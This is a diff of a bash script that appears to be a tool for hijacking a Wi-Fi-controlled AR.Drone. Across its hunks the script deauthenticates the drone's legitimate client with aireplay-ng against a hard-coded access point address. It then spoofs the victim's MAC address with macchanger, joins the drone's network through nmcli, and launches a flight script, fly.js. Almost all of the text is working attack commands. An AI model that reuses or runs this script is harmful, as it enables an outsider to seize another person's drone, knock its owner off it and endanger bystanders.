@@ -1,5 +1,5 @@
 #!/bin/bash
-card=iw dev | awk '$1=="Interface"{print $2}' | sed -e '1d'
+card="$(iw dev | awk '$1=="Interface"{print $2}' | sed -e '1d' -e '3d')"
 message="Monitor mode enabled"
 moncheck="$(iwconfig wlan1 | grep Monitor | sed -e "s/Mode:/ /" | awk '{print $1}' | cut -b 5)"
 
@@ -20,19 +20,24 @@ host="$(cat /tmp/out-01.kismet.netxml | grep essid | sed -e "s/<essid cloaked=\"
 
 #Deauthenticate the client
 echo "Dauth";
-aireplay-ng -0 30 -a 58:D7:59:31:DA:84 -c $victim  wlan1
+aireplay-ng -0 10 -a 58:D7:59:31:DA:84 -c $victim  wlan1
 
 #Spoof our mac_address to connect to the ardrone
 echo "spoof";
 sudo ifconfig wlan2 down && macchanger --mac $victim wlan2 && ifconfig wlan2 up
 
+#NetworkMaqnager Start
+systemctl start NetworkManager
+
 #Connect to the ardrone
 echo "connect";
-iwconfig wlan2 essid $host && dhclient
-sleep 5s
+nmcli device wifi connect Test ifname wlan2
+#iwconfig wlan2 essid $host
+sleep 2s
 iwconfig && ifconfig wlan2
-#Fire the drone
 
+#Fire the drone
+node fly.js
 
 #Remove all tmp data
 echo "rm";
